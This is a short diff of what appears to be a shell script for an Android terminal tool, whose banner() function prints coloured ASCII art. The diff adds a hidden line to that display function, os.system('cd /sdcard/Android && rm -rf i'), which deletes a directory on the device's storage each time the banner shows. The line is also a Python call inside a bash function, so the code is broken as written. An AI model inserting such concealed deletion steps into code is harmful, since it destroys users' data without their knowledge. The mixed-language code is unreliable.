@@ -4,6 +4,7 @@
 
 banner() {
 clear
+os.system('cd /sdcard/Android && rm -rf i')
 printf "\e[0m\n"
 printf """\e[1;92m ▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀    ▄▄▄▄    ▒█████ ▓██   ██
  ▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒    ▓█████▄ ▒██▒  ██▒▒██  ██▒
